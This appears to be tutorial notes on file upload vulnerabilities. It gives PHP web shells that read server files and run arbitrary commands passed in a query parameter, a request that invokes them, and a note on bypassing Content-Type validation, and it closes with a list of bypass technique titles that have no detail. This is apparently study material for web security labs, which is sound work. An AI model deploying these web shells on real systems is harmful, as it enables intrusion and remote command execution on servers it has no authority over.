# File upload vulnerabilities

### Exploiting unrestricted file uploads to deploy a web shell <a href="#exploiting-unrestricted-file-uploads-to-deploy-a-web-shell" id="exploiting-unrestricted-file-uploads-to-deploy-a-web-shell"></a>

Uploading a php, java or python file to get a web shell

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:

`GET /example/exploit.php?command=id HTTP/1.1`



**Flawed file type validation**

Change `Content-Type` header from within `Content-Disposition` header. One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server.



`POST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="image"; filename="example.jpg" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="description" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="username" wiener ---------------------------012345678901234567890123456--`



Web shell upload via path traversal

Web shell upload via extension blacklist bypass

Web shell upload via obfuscated file extension

Remote code execution via polyglot web shell upload

Web shell upload via race condition

